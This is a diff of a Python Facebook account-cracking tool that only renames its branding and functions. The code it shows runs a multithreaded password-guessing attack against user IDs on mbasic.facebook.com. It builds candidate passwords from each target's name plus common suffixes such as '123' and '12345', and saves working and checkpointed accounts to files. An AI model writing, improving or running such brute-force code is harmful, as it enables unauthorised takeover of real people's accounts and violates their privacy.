@@ -92,10 +92,10 @@ def hasil(OK,cp):
 	if len(cp) != 0:
 	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRK_OK.txt' % (H, P, str(len(ok))))
 	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mRK_CP.txt' % (H, P, str(len(cp))))
-	    input("\x1b[1;97mPress enter to back R.K.W Menu ")
-	    rizwan()
+	    input("\x1b[1;97mPress enter to back SSB Menu ")
+	    sarfraz()
 
-def rizwan():
+def sarfraz():
     os.system('clear')
     print(logo)
     ipm = requests.get(url_ip).json()
@@ -108,19 +108,19 @@ def rizwan():
     print(' [2] Create File [Best-Method]')
     print(' [E] exit ')
     print('')
-    _rizwan___ = input(' [?] Choose options : ')
-    if _rizwan___ in ('1', '01'):
-        __xxx__().rizwanx(id)
-    if _rizwan___ in ('2', '02'):
+    _sarfraz___ = input(' [?] Choose options : ')
+    if _sarfraz___ in ('1', '01'):
+        __xxx__().sarfrazx(id)
+    if _sarfraz___ in ('2', '02'):
         create_file()
-    if _rizwan___ in ('E', 'ee'):
+    if _sarfraz___ in ('E', 'ee'):
         pass
 
 
 class __xxx__:
     def __init__(self):
         self.id = []
-    def rizwanx(self,id):
+    def sarfrazx(self,id):
         os.system("clear")
         print(logo)
         self.cnt = input('Put File Name : ')
@@ -133,10 +133,10 @@ class __xxx__:
             self.__pler__()
         else:
             print(' [!] Choose Correct One');
-            self.rizwanx(id)
+            self.sarfrazx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r \x1b[1;97m[RK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
+        sys.stdout.write(f"\r \x1b[1;97m[SSB] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -240,7 +240,7 @@ class __xxx__:
             print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with rizwanrkw(max_workers=30) as rkwworld:
+            with sarfrazssb(max_workers=30) as ssbworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -255,7 +255,7 @@ class __xxx__:
                         else:
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
-                        rkwworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -274,7 +274,7 @@ class __xxx__:
             print('\033[1;37m Total IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with rizwanrkw(max_workers=30) as rkwworld:
+            with sarfrazssb(max_workers=30) as ssbworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -283,7 +283,7 @@ class __xxx__:
                             pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                         else:
                             pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        rkwworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -353,7 +353,7 @@ def manual():
     print('  Ids saved as: '+save_file)
     print(50*'-')
     input(' Press enter to back')
-    rizwan()
+    sarfraz()
     
 def auto():
     os.system('rm -rf temp*')
@@ -464,8 +464,8 @@ def auto():
     print('  File saved as: /sdcard/'+save_file)
     print(50*'-')
     input('  Press enter to back ')
-    rizwan()
+    sarfraz()
     
     
     
-rizwan()
+sarfraz()
